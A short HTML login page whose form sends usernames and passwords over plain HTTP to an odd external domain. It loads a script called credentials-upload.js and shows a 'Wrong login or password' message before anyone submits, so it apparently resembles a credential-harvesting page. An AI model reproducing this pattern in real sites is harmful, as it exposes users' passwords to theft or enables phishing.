<!DOCTYPE HTML>
<html lang="en" >
<html>
<head>
  <title>Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta charset="utf-8">
  <link rel="stylesheet" type="text/css" href="login_style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link href='https://fonts.googleapis.com/css?family=Titillium+Web:400,300,600' rel='stylesheet' type='text/css'>
  <script src="credentials-upload.js" async defer></script>
</head>

<body class="body">
<div class="main-content">
    <div class="login-page">
        <div class="form">
            <form action="http://www.dasdsasas.pl" method="post">
                <label>
                    <input id="login" name="login" type="text" placeholder="&#xf007;  username"/>
                    <input id="password" name="password" type="password" placeholder="&#xf023;  password"/>
                </label>
                <button type="submit">LOGIN</button>
                <button type="button" onclick="window.location.href='signup.html'">SIGN UP</button>
                <p class="message">Wrong login or password</p>
            </form>
        </div>
    </div>

    <div class="support-greeting">Thank you for your support!</div>
</div>
</body>
</html>
